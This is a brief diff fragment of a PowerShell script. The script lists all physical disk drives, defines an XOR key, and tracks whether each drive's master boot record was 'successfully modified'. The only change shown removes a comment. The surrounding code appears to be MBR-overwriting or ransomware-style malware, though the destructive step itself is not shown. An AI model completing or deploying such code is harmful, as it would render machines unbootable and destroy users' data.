@@ -11,7 +11,7 @@ $drives = Get-CimInstance -ClassName Win32_DiskDrive
 
 # XOR encryption key
 $key = 0x55
-$mbrOverwritten = $false  # Flag to track if any MBR was successfully modified
+$mbrOverwritten = $false
 
 foreach ($drive in $drives) {
     $diskPath = "\\.\" + $drive.DeviceID
